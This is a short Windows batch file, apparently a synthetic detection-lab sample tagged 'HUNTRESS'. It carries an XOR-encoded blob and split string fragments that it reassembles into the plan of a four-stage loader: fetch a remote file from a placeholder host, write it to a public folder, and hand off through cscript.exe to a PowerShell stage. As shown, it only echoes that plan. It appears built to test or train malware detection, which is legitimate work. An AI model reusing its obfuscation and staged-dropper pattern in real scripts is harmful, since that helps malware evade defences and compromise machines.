@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|xor_5a
rem HUNTRESS-MATERIAL:rliK05WOppGau5mbs9zd/0zOukyZ/0zOukSBuIyP0YiL74DdulTaqhmbu5Gb/c3P9sjLpYAO7YRKp8DKuQzLSYQOzYDOvogBpgyPp8gBglxZy4yOqUwP2MDPm4yO+QXO4s2autWavVnPzYzOsQzM09jNqczOi8DdulTaqhmbu5Gb/UXdgliKu4iMnZDKvYib5kmao5mbux2P3RTPzsjK3sTOn5zMFQTPzsjK3sTOmYjN/ITKo8TL1oyZ/0zOv0DN7YTBuIyP0YiP0UzN7MjPnJjK7gSPm42ZuQzL1kTB/0zOukiJ/IyP05iKzgSOpkzZo8jLqsjP7YiLqMDK5kSB8wTN+QzOyYXKp8TO1giKFITOusjKpMjP29jNzwTB/4yMo0id/4SN38DKF8DKz8yK5szZpoyPukiJrdGL
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "fragment0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=csc"
SeT "fragment1=ript.exe|stage_count=4|graph=diamond|next_language=powershell|campaign_id=campa"
SeT "fragment2=ign-e6444203c4|url=https://e6444203c4.example.invalid/531411bc.dat|file_path=C:"
SeT "fragment3=\Users\Public\HuntressLab\stage-e6444203c4.dat|next_stage=stage-e6444203c4.ps1"
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=3d521444"
set "recovered_configuration=!fragment0!!fragment1!!fragment2!!fragment3!"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo cscript.exe acquire, write, dispatch, and hand off stage-e6444203c4.ps1
exit /b 0
